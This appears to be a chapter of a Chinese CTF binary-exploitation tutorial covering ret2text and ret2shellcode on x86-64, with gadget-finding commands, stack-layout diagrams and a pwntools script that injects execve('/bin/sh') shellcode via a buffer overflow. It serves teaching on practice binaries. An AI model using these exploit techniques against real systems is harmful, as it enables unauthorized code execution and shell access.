# 第 9 章 ret2text 与 ret2shellcode

> 程序里没有明显的 `win()` 函数？别慌。要么借用程序里已有的代码片段（ret2text），要么自己写一段 shellcode 塞进去（ret2shellcode）。

---

## 9.1 本章目标

- 理解 ret2text 的思路：在程序自身代码里找可利用的片段
- 掌握 ret2shellcode：把 shellcode 写入可执行内存并跳转执行
- 理解 NX 保护为什么能干掉 ret2shellcode

---

## 9.2 ret2text：借用程序自己的代码

### 9.2.1 场景一：程序里有隐藏的 system 调用

很多 CTF 题目虽然不叫 `win()`，但程序里可能藏了这样的代码：

```c
void backdoor() {
    system("/bin/sh");
}
```

或者：

```c
system("cat flag");
```

这些函数即使没有被调用，代码也存在于 `.text` 段里。只要找到它们的地址，覆盖返回地址跳过去就行——和第 8 章的 `win()` 本质上是一回事。

找这类函数的方法：

```bash
# 查看所有函数
nm ./vuln

# 搜索 system、execve 等危险调用
objdump -d ./vuln | grep -A5 -B5 'system\|execve'

# 直接搜字符串
strings -a -t x ./vuln | grep -i 'sh\|flag\|bin'
```

### 9.2.2 场景二：控制参数调用 system

更常见的场景：程序调用了 `system` 但参数不是 `/bin/sh`，或者根本没调用 `system`，但导入了它。

```c
#include <stdlib.h>

void vulnerable() {
    char buf[64];
    gets(buf);
    printf("Echo: %s\n", buf);
}
```

如果程序导入了 `system`（通过其他代码路径），我们可以做这样的布局：

```text
栈布局：
[ 填充 72 字节 ][ system 地址 ][ 返回地址 ][ "/bin/sh" 的地址 ]
                    │              │              │
                    │              │              └─ 作为 rdi 传递
                    │              └─ system 执行完后去哪（可以是 main 或 exit）
                    └─ 跳转到 system
```

但这里有个关键问题：**x86-64 下函数参数通过 rdi 寄存器传递，而不是栈**。直接把 `/bin/sh` 的地址放在栈上，system 是收不到的。

要控制 rdi，我们需要一个 gadget：`pop rdi; ret`。

```bash
ROPgadget --binary ./vuln | grep 'pop rdi'
# 输出：0x0000000000001013 : pop rdi ; ret
```

这个 gadget 的意思是：

```asm
pop rdi    ; 从栈上弹出一个值到 rdi
ret        ; 再从栈上弹出一个值并跳转
```

所以 payload 的结构变成：

```text
[ 填充 72 字节 ]
[ pop rdi; ret 的地址 ]
[ "/bin/sh" 字符串的地址 ]
[ system 的地址 ]
[ system 执行完后的返回地址 ]
```

执行流程：

1. 函数返回，`ret` 弹出 `pop rdi; ret` 的地址 → 跳过去
2. `pop rdi` 从栈上弹出 `/bin/sh` 的地址 → rdi = "/bin/sh"
3. `ret` 从栈上弹出 `system` 的地址 → 跳到 system
4. system 执行 `system("/bin/sh")` → getshell！

这就是 **ROP 的雏形**——用程序里现有的指令片段（gadget）拼凑出我们想要的逻辑。

> 🔥 **实战**：写一个 ret2text 利用脚本。假设程序里有 `system@plt` 和字符串 `/bin/sh`（可以先自己编译一个包含这些的程序来练习）。

### 9.2.3 找字符串地址

```bash
# 找 /bin/sh 字符串
strings -a -t x ./vuln | grep '/bin/sh'
# 输出可能是：1d3  /bin/sh（文件偏移）

# 转换成虚拟地址：用 readelf -S 找到 .rodata 的加载地址和文件偏移的对应关系
# 或者用 pwntools：
python3 -c "
from pwn import *
elf = ELF('./vuln')
print(hex(next(elf.search(b'/bin/sh'))))
"
```

`elf.search()` 会直接在虚拟地址空间里搜索字符串，返回其地址，非常方便。

---

## 9.3 ret2shellcode：自己写代码，自己执行

### 9.3.1 思路

既然程序里有漏洞能让我们往内存里写数据，为什么不能写一段**自己的代码**（shellcode）进去，然后让程序跳过去执行呢？

条件：

1. 有一段可写的内存（栈、`.bss`、堆都行）
2. 这段内存**可执行**（NX 关闭，或用 mprotect 赋予执行权限）
3. 能控制返回地址跳到那里

### 9.3.2 把 shellcode 放在栈上

这是最直接的方式（第二章我们开了 `-z execstack` 就是这个目的）：

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln', checksec=False)

# 生成 execve("/bin/sh") 的 shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# 我们需要知道 shellcode 在栈上的地址（假设 ASLR 关闭，且已通过调试确定）
# 先用 cyclic 找到从 buf 到返回地址的偏移，然后：
stack_addr = 0x7fffffffe0c8     # buf 的地址（需要通过调试获取）

payload = flat({
    0: shellcode,              # shellcode 从 buf 起始处开始
    72: p64(stack_addr)        # 返回地址指向 shellcode 起始位置
})

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

**问题**：如果 ASLR 开启，栈地址每次都变，你不知道 shellcode 在哪个地址。解决方案：

- 先泄露栈地址（比如用格式化字符串）
- 或者把 shellcode 放到地址固定的地方（比如 `.bss`，前提是没有 PIE）

### 9.3.3 把 shellcode 放在 .bss 段

如果程序没有 PIE，`.bss` 的地址是固定的：

```python
bss_addr = elf.bss()    # 比如 0x404000

# payload 分两部分：
# 第一部分：通过某个输入函数把 shellcode 写到 bss
# 第二部分：栈溢出覆盖返回地址为 bss_addr
```

这通常需要程序有两个输入点：一个把数据写到 bss，一个触发栈溢出。

### 9.3.4 写入 shellcode 的常见方式

| 方式 | 适用场景 |
| --- | --- |
| `gets`/`read` 读入栈 | NX 关闭 + ASLR 关闭（或已泄露栈地址） |
| `read` 读入 `.bss` | 无 PIE，bss 足够大且可写 |
| `strcpy` 复制到堆 | NX 关闭时 |
| `mmap` + `mprotect` | 需要绕过 NX 时 |

---

## 9.4 NX 开启时的困境

现代系统默认开启 NX，栈和堆都不可执行。这时候：

- ret2shellcode 直接失效（跳到栈上执行会 SIGSEGV）
- ret2text 仍然有效（因为 `.text` 段本来就可执行）

那么，当程序里既没有 `system("/bin/sh")` 的后门，又没有现成的 `pop rdi; ret` gadget 时怎么办？

答案是：**ret2libc**——借用 libc 库里现成的 `system` 函数和 `/bin/sh` 字符串。但那需要先解决 ASLR（libc 地址随机）。这就是下一章的主题。

---

## 9.5 常见坑

1. **shellcode 里有坏字符**：某些输入函数会在遇到 `\x00`、`\n` 等字符时停止，导致 shellcode 被截断。用 `msfvenom` 生成时可以指定 badchars，或者用编码后的 shellcode。
2. **gadget 地址写错**：64 位用 `p64()`，32 位用 `p32()`。
3. **栈对齐**：调用 libc 函数时，rsp 必须 16 字节对齐。如果你在 payload 里调用了 `system` 却崩溃在 `movaps` 指令上，试试在 ret2text 前插入一个单独的 `ret` gadget 来调整对齐。
4. **找不到 gadget**：用 `ROPgadget --binary ./vuln --only 'pop|ret'`，或者用 pwntools 的 `ROP` 对象。

---

## 9.6 小结

这一章我们学了两条路：

- **ret2text**：在程序自身代码里找可用的函数或 gadget，通过控制 rdi 传递参数
- **ret2shellcode**：把 shellcode 写入可执行内存，跳转执行

但两者都有局限：ret2text 依赖程序里有合适的代码，ret2shellcode 依赖 NX 关闭。现实中的 CTF 题目通常NX 开启、程序精简，这时就需要更强大的武器——ret2libc 和 ROP。

---

**下一章**：[ret2libc：借别人的代码用](./ch10-ret2libc.md)
